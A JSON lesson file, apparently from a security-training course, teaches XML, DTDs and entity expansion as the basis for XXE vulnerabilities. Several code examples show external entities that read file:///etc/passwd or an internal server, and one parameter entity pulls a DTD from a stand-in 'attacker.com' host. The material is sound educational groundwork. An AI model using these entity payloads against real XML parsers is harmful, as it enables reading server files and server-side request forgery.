@@ -1,0 +1,136 @@
+{
+  "id": "xml-basics",
+  "category": "fundamentals",
+  "title": "XML & DTD Basics",
+  "description": "Understanding XML structure, Document Type Definitions (DTDs), and entity processing - the foundation for comprehending XXE vulnerabilities.",
+  "severity": "info",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "content": "XML (eXtensible Markup Language) is a markup language that defines rules for encoding documents in a format that is both human-readable and machine-readable. To understand XXE vulnerabilities, you must first understand how XML parsers process entities and DTDs.\n\nThis guide covers the fundamental concepts of XML, DTDs, and entity processing that form the basis for understanding XXE attacks.",
+      "type": "text"
+    },
+    {
+      "id": "xml-structure",
+      "title": "XML Document Structure",
+      "content": "A basic XML document consists of elements with opening and closing tags, attributes, and content. Here's a simple example:",
+      "type": "text"
+    },
+    {
+      "id": "xml-example",
+      "title": "Simple XML Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<catalog>\n  <book id=\"1\">\n    <title>Security Engineering</title>\n    <author>Ross Anderson</author>\n    <price>59.99</price>\n  </book>\n  <book id=\"2\">\n    <title>The Web Application Hacker's Handbook</title>\n    <author>Dafydd Stuttard</author>\n    <price>49.99</price>\n  </book>\n</catalog>"
+      }
+    },
+    {
+      "id": "dtd-introduction",
+      "title": "Document Type Definition (DTD)",
+      "content": "A DTD defines the structure and legal elements of an XML document. DTDs can be declared inline (internal) or referenced from external files (external). DTDs are where XML entities are declared.\n\nThere are two types of DTDs:\n\n**Internal DTD**: Declared within the XML document itself\n**External DTD**: Referenced from an external file or URL",
+      "type": "text"
+    },
+    {
+      "id": "internal-dtd-example",
+      "title": "Internal DTD Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n  <!ELEMENT note (to,from,heading,body)>\n  <!ELEMENT to (#PCDATA)>\n  <!ELEMENT from (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body (#PCDATA)>\n]>\n<note>\n  <to>Security Team</to>\n  <from>Developer</from>\n  <heading>Reminder</heading>\n  <body>Disable external entities in production!</body>\n</note>"
+      }
+    },
+    {
+      "id": "entities-introduction",
+      "title": "XML Entities",
+      "content": "XML entities are a way to represent data within XML documents. There are several types of entities:\n\n**1. Character Entities**: Represent special characters (e.g., `&lt;` for <)\n**2. General Entities**: Custom entities defined in the DTD\n**3. Parameter Entities**: Used within DTD definitions (prefixed with %)\n**4. External Entities**: Reference content from external sources (the source of XXE vulnerabilities)\n\nEntities are declared in the DTD and then referenced in the XML document using the `&entityname;` syntax.",
+      "type": "text"
+    },
+    {
+      "id": "general-entity-example",
+      "title": "General Entity Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE message [\n  <!ENTITY company \"ACME Corporation\">\n  <!ENTITY email \"security@acme.com\">\n]>\n<message>\n  <from>&company;</from>\n  <contact>&email;</contact>\n  <text>This is a message from our company.</text>\n</message>"
+      }
+    },
+    {
+      "id": "external-entities",
+      "title": "External Entities",
+      "content": "External entities reference content from outside the XML document. This is where XXE vulnerabilities originate. When an XML parser processes an external entity, it retrieves the content from the specified location.\n\nExternal entities use the SYSTEM keyword to specify the location:",
+      "type": "text"
+    },
+    {
+      "id": "external-entity-example",
+      "title": "External Entity Syntax",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!ENTITY entityname SYSTEM \"URI\">\n\n<!-- Examples -->\n<!ENTITY external SYSTEM \"http://example.com/data.xml\">\n<!ENTITY localfile SYSTEM \"file:///etc/passwd\">\n<!ENTITY network SYSTEM \"http://internal-server/secret\">"
+      }
+    },
+    {
+      "id": "parameter-entities",
+      "title": "Parameter Entities",
+      "content": "Parameter entities are special entities used within DTD declarations. They are defined and referenced with a percent sign (%). Parameter entities are particularly important in blind XXE attacks.\n\nSyntax: `<!ENTITY % name \"value\">`\n\nParameter entities can only be used within the DTD, not in the XML document content.",
+      "type": "text"
+    },
+    {
+      "id": "parameter-entity-example",
+      "title": "Parameter Entity Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!ENTITY % system \"Windows 10\">\n<!ENTITY % version \"21H2\">\n<!ENTITY full \"%system; %version;\">\n\n<!-- Parameter entities can also reference external DTDs -->\n<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n%remote;"
+      }
+    },
+    {
+      "id": "entity-expansion",
+      "title": "Entity Expansion Process",
+      "content": "When an XML parser encounters an entity reference, it expands (replaces) the reference with the entity's value. This process is called entity expansion.\n\n**For internal entities**: The parser substitutes the predefined value\n**For external entities**: The parser:\n1. Retrieves content from the specified URI\n2. Parses the retrieved content\n3. Substitutes the entity reference with the content\n\nThis automatic retrieval and parsing of external content is what makes XXE attacks possible.",
+      "type": "text"
+    },
+    {
+      "id": "entity-expansion-diagram",
+      "title": "Entity Expansion Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Entity Declaration -->\n<!ENTITY company \"ACME Corp\">\n\n<!-- Entity Reference in XML -->\n<name>&company;</name>\n\n<!-- After Entity Expansion -->\n<name>ACME Corp</name>\n\n<!-- External Entity Example -->\n<!ENTITY external SYSTEM \"file:///etc/passwd\">\n<data>&external;</data>\n\n<!-- Parser retrieves file content and expands -->\n<data>\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\n</data>"
+      }
+    },
+    {
+      "id": "security-implications",
+      "title": "Security Implications",
+      "content": "The ability for XML parsers to automatically retrieve and process external entities creates several security risks:\n\n**1. File Disclosure**: Attackers can read arbitrary files from the server's filesystem\n**2. SSRF (Server-Side Request Forgery)**: Attackers can make the server send requests to internal systems\n**3. Denial of Service**: Malicious entity definitions can cause excessive resource consumption\n**4. Remote Code Execution**: In some configurations, attackers can execute arbitrary code\n\nBy default, most XML parsers have external entity processing **enabled**, making applications vulnerable unless developers explicitly disable it.",
+      "type": "text"
+    },
+    {
+      "id": "key-takeaways",
+      "title": "Key Takeaways",
+      "content": "Understanding these fundamentals is essential for comprehending XXE vulnerabilities:\n\n- XML documents can include DTD declarations that define entities\n- External entities reference content from external URIs (files, URLs)\n- XML parsers automatically retrieve and expand external entities\n- This automatic behavior is often enabled by default\n- Parameter entities are used in DTDs and are key to blind XXE attacks\n- Entity expansion can access local files, network resources, and more\n\nThe next step is understanding how attackers exploit these features to perform XXE attacks.",
+      "type": "text"
+    }
+  ],
+  "relatedTopics": [
+    "entity-processing",
+    "classic-xxe",
+    "blind-xxe"
+  ],
+  "references": [
+    {
+      "title": "W3C XML Specification",
+      "url": "https://www.w3.org/TR/xml/"
+    },
+    {
+      "title": "XML DTD Tutorial",
+      "url": "https://www.w3schools.com/xml/xml_dtd_intro.asp"
+    },
+    {
+      "title": "OWASP XXE Processing",
+      "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    }
+  ]
+}
